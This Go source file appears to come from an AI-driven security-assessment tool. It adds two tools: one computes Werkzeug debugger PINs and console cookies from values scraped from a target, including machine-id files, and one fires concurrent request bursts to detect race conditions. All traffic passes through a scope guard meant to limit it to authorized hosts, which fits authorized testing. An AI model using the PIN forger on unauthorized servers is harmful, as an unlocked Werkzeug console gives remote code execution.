package solver

import (
	"context"
	"crypto/md5"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash"
	"hash/fnv"
	"math/big"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/well-lzz/chronos/internal/nettools"
)

// Assessment primitives. These are GENERAL, reusable security-assessment
// techniques parameterized entirely by what the model observes at runtime — they
// carry no target-specific data. Every network action is routed through the same
// scope guard as http_request, so a primitive can never reach a host outside the
// authorized scope.

// werkzeugPIN reproduces Werkzeug's debugger-PIN algorithm. The bits are the
// values the model scrapes from the unauthenticated debugger page / target
// (username, module name, app name, app file path, MAC as uuid.getnode()'s
// decimal, and the machine id). algo is "sha1" (Werkzeug >= 0.15) or "md5".
func werkzeugPIN(bits []string, algo string) (pin, cookie string) {
	var h hash.Hash
	if algo == "md5" {
		h = md5.New()
	} else {
		h = sha1.New()
	}
	for _, b := range bits {
		if b == "" { // Werkzeug skips empty bits
			continue
		}
		h.Write([]byte(b))
	}
	h.Write([]byte("cookiesalt"))
	// Sum does not alter the running state, so the hash keeps accumulating.
	cookie = "__wzd" + hex.EncodeToString(h.Sum(nil))[:20]

	h.Write([]byte("pinsalt"))
	full := hex.EncodeToString(h.Sum(nil))
	n := new(big.Int)
	n.SetString(full, 16)
	num := fmt.Sprintf("%09d", n) // min width 9; a 160-bit value is far longer
	num = num[:9]

	// Group the 9 digits the way Werkzeug does (first of 5/4/3 that divides).
	group := ""
	for _, gs := range []int{5, 4, 3} {
		if len(num)%gs == 0 {
			var parts []string
			for i := 0; i < len(num); i += gs {
				parts = append(parts, num[i:i+gs])
			}
			group = strings.Join(parts, "-")
			break
		}
	}
	if group == "" {
		group = num
	}
	return group, cookie
}

func (s *Solver) toolWerkzeugPin(argsJSON string) string {
	var a struct {
		Username  string `json:"username"`
		Modname   string `json:"modname"`
		Appname   string `json:"appname"`
		Filename  string `json:"filename"`
		Node      string `json:"node"`
		MachineID string `json:"machine_id"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &a); err != nil {
		return "werkzeug_pin error: bad args: " + err.Error()
	}
	if a.Modname == "" {
		a.Modname = "flask.app"
	}
	if a.Appname == "" {
		a.Appname = "Flask"
	}
	if strings.TrimSpace(a.Node) == "" || strings.TrimSpace(a.MachineID) == "" {
		return "werkzeug_pin error: node (uuid.getnode() as a decimal string) and machine_id are required — scrape them from the target (e.g. /sys/class/net/*/address → decimal MAC, and /etc/machine-id or /proc/sys/kernel/random/boot_id)."
	}
	bits := []string{a.Username, a.Modname, a.Appname, a.Filename, a.Node, a.MachineID}
	sha1Pin, sha1Cookie := werkzeugPIN(bits, "sha1")
	md5Pin, md5Cookie := werkzeugPIN(bits, "md5")
	return jsonOut(map[string]any{
		"sha1": map[string]string{"pin": sha1Pin, "cookie_name": sha1Cookie, "werkzeug": ">=0.15"},
		"md5":  map[string]string{"pin": md5Pin, "cookie_name": md5Cookie, "werkzeug": "<0.15"},
		"note": "Try the sha1 PIN first (modern Werkzeug). The cookie_name is the __wzd… cookie the console sets once the PIN is accepted.",
	})
}

type raceResult struct {
	display string
}

func (s *Solver) toolRace(ctx context.Context, argsJSON string) string {
	var a struct {
		URL     string            `json:"url"`
		Method  string            `json:"method"`
		Headers map[string]string `json:"headers"`
		Body    string            `json:"body"`
		Count   int               `json:"count"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &a); err != nil {
		return "race error: bad args: " + err.Error()
	}
	raw := a.URL
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	host := ""
	if u, err := url.Parse(raw); err == nil {
		host = u.Hostname()
	}
	if ok, msg := s.hostAllowed(host); !ok {
		return msg
	}
	n := a.Count
	if n <= 0 {
		n = 10
	}
	if n > 50 {
		n = 50 // bound the burst
	}
	allow := func(h string) bool { return s.scopeSnapshot().Allows(h) }

	results := make([]raceResult, n)
	var wg sync.WaitGroup
	start := make(chan struct{}) // release all goroutines together to maximize overlap
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			<-start
			results[i] = raceResult{display: nettools.DoRawHTTP(ctx, a.URL, a.Method, a.Headers, a.Body, 30*time.Second, allow, s.insecureTLS)}
		}(i)
	}
	close(start)
	wg.Wait()

	// Bucket by outcome signature (status + response body, not the echoed request)
	// to surface divergence. All race requests are identical, so any difference is
	// a genuine server-side divergence.
	buckets := map[string]int{}
	example := map[string]raceResult{}
	for _, r := range results {
		sig := outcomeSignature(r.display)
		buckets[sig]++
		if _, seen := example[sig]; !seen {
			example[sig] = r
		}
	}
	sigs := make([]string, 0, len(buckets))
	for sig := range buckets {
		sigs = append(sigs, sig)
	}
	sort.Slice(sigs, func(i, j int) bool { return buckets[sigs[i]] > buckets[sigs[j]] })

	var b strings.Builder
	fmt.Fprintf(&b, "race: fired %d concurrent %s %s → %d distinct outcome(s)\n", n, methodOr(a.Method), a.URL, len(buckets))
	for _, sig := range sigs {
		fmt.Fprintf(&b, "  [%dx] %s\n", buckets[sig], sig)
	}
	// Record one example per distinct outcome as citable evidence.
	for _, sig := range sigs {
		r := example[sig]
		if tid, err := s.tl.RecordHTTP(methodOr(a.Method), a.URL, a.Headers, a.Body, r.display, s.ModelSpec); err == nil {
			fmt.Fprintf(&b, "  evidence for [%s]: [traffic %s]\n", sig, tid)
		}
	}
	if len(buckets) > 1 {
		b.WriteString("Divergent outcomes under concurrency suggest a TOCTOU/race window — inspect the differing responses with traffic_get.")
	} else {
		b.WriteString("No divergence observed; the endpoint handled the concurrent burst uniformly.")
	}
	return b.String()
}

func methodOr(m string) string {
	if strings.TrimSpace(m) == "" {
		return "GET"
	}
	return strings.ToUpper(m)
}

// httpStatusLine is the first line of a DoRawHTTP transcript (the "HTTP <code>…"
// status line).
func httpStatusLine(display string) string {
	if i := strings.IndexByte(display, '\n'); i >= 0 {
		return strings.TrimSpace(display[:i])
	}
	return strings.TrimSpace(display)
}

// httpBody returns only the response body of a DoRawHTTP transcript, excluding
// the status line, the echoed request URL, and the response headers. Error
// transcripts (no body marker) are returned whole.
func httpBody(display string) string {
	const marker = "--- response body ---\n"
	if i := strings.Index(display, marker); i >= 0 {
		return display[i+len(marker):]
	}
	return display
}

// outcomeSignature collapses a transcript into a comparable key built from the
// status line and the RESPONSE BODY only — never the request URL, whose length
// and content vary per request and would otherwise fake a difference.
func outcomeSignature(display string) string {
	body := httpBody(display)
	h := fnv.New32a()
	_, _ = h.Write([]byte(body))
	return fmt.Sprintf("%s | bodylen=%d | %08x", httpStatusLine(display), len(body), h.Sum32())
}
